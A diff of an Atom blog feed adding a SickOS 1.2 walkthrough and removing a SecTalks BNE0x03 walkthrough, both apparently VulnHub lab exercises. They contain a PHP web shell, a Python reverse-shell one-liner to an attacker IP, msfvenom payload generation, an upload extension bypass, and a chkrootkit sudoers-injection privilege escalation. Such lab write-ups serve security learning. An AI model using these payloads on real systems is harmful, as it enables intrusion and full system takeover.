@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-02T14:46:50-05:00</updated>
+  <updated>2016-06-02T14:48:53-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,134 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[sickos1.2]]></title>
+    <link href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/"/>
+    <updated>2016-05-31T13:08:16-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2</id>
+    <content type="html"><![CDATA[<p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>
+
+<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Nikto</li>
+<li>Wfuzz</li>
+<li>Curl</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>)</p>
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.180 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.180 -p-</code></p>
+
+<p>Looks like port 22 and port 80 are openning.</p>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Check the <a href="http://192.168.79.180">http://192.168.79.180</a></p>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Not excited.</p>
+
+<p>use Nikto:</p>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Still nothing cool</p>
+
+<p>try wfuzz:</p>
+
+<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.180/FUZZ 2&gt;/dev/null
+</code></pre>
+
+<p>find a test dir:</p>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next exam the HTTP options:</p>
+
+<pre><code>curl -v -X OPTIONS http://192.168.79.180/test/
+</code></pre>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like it supports PUT.</p>
+
+<p>Now upload php reverse shell (I tried different ports, looks like only 443 port works):</p>
+
+<pre><code>nmap -p80 192.168.79.180 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php'
+</code></pre>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now the shell is uploaded:</p>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the reverse shell:</p>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>A better php shell:</p>
+
+<pre><code class="php">&lt;?php system($_GET["exec"]); ?&gt;
+</code></pre>
+
+<p>Upload this shell, and in brower:</p>
+
+<pre><code>http://192.168.79.180/test/exec.php?exec=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.79.173",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code></pre>
+
+<p>get the shell.</p>
+
+<p>During enumeration step, I follow <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a></p>
+
+<p><code>ls -l /etc/cron.daily</code></p>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>After enumeration, find the system has chkrootkit:</p>
+
+<p><code>dpkg -l | grep chkrootkit</code></p>
+
+<p>chkrootkit verions is 0.49 and it is vulnerable.</p>
+
+<p><code>searchsploit chkrootkit</code></p>
+
+<p><code>echo 'chmod 777 /etc/sudoers &amp;&amp; echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update</code></p>
+
+<p>also need to change the privilages on the update file with chmod 777 and wait:</p>
+
+<p><code>ls -al /etc/sudoers</code></p>
+
+<p>try:</p>
+
+<p><code>sudo su</code></p>
+
+<p><img src="/images/blog/vulhub/sickos1.2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[sickos:1.1]]></title>
@@ -535,126 +663,6 @@ jar -cvf ../webshell.war *</p>
 <p><img src="/images/blog/vulhub/bne03/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>DONE.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SecTalks: BNE0x03 - Simple]]></title>
-    <link href="http://wg135.github.io/blog/2016/04/20/sectalks-bne0x03-simple/"/>
-    <updated>2016-04-20T13:49:22-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/04/20/sectalks-bne0x03-simple</id>
-    <content type="html"><![CDATA[<p><em>May the LORD, my rock, be praised, who trains my hands for battle and my fingers for warfare.</em> &mdash;- Psalm 144:1</p>
-
-<p>From <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">Vulhub</a>
-Simple CTF is a boot2root that focuses on the basics of web based hacking. Once you load the VM, treat it as a machine you can see on the network, i.e. you don&rsquo;t have physical access to this machine. Therefore, tricks like editing the VM&rsquo;s BIOS or Grub configuration are not allowed. Only remote attacks are permitted. /root/flag.txt is your ultimate goal.</p>
-
-<!--more-->
-
-
-<h3>Forces:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>Burp Suite</li>
-<li>Metasploit</li>
-</ul>
-
-
-<h3>Detail Assessment and Planning</h3>
-
-<ul>
-<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
-<li>Search the web app vulnerability  &mdash; searchsploit</li>
-<li>Generate and upload webshell  &mdash;metasploit</li>
-<li>Get root</li>
-</ul>
-
-
-<h3>Waging War</h3>
-
-<h4>Weaknesses and Strengths</h4>
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.172 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.79.172 -p-</code></p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Only port 80 is opening. Lets use Iceweasel to view the page.</p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>I noticed that the web app is Cutenews 2.0.3. search the exploit:</p>
-
-<p><code>searchsploit cutenews</code></p>
-
-<p>find the interesting results:</p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>The exploit is as follow:</p>
-
-<ul>
-<li>Sign up for New User</li>
-<li>Log In</li>
-<li>Go to Personal options <a href="http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal">http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal</a></li>
-<li>Select Upload Avatar Example: Evil.jpg</li>
-<li>use tamper data  &amp; Rename File Evil.jpg to Evil.php</li>
-</ul>
-
-
-<p>Okay, firstly, I creat a reverse php shell,</p>
-
-<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.156 LPORT=1234 -a php --platform php -o evil.jpg</code></p>
-
-<p>Now, use Burp as proxy, go to Personal options <a href="http://192.168.79.172/cutenews/index.php?mod=main&amp;opt=personal">http://192.168.79.172/cutenews/index.php?mod=main&amp;opt=personal</a> to upload evil.jpg</p>
-
-<p>in the burp, change the evil.jgp to evil.php</p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>After that, Burp will recevied a GET request:</p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>set metasploit multi/handler.</p>
-
-<p>now go to <a href="http://192.168.79.172/uploads/avatar_bob1bob2.php">http://192.168.79.172/uploads/avatar_bob1bob2.php</a> will get meterpreter reverse shell:</p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>However, I am not the root, search the os version:</p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>search the ubuntu 14.04</p>
-
-<p><code>searchsploit ubuntu 14.04</code> and we get the result:</p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Move the file to /var/www/html/ and in reverse shell:</p>
-
-<p><code>wget http://192.168.79.156/37292.c -O hack.c</code></p>
-
-<p>compile it:</p>
-
-<p><code>gcc hack.c -o hack -static</code>, run it.</p>
-
-<p>then use <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> to get the shell.</p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><img src="/images/blog/vulhub/simple_ctf1/last.jpg" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
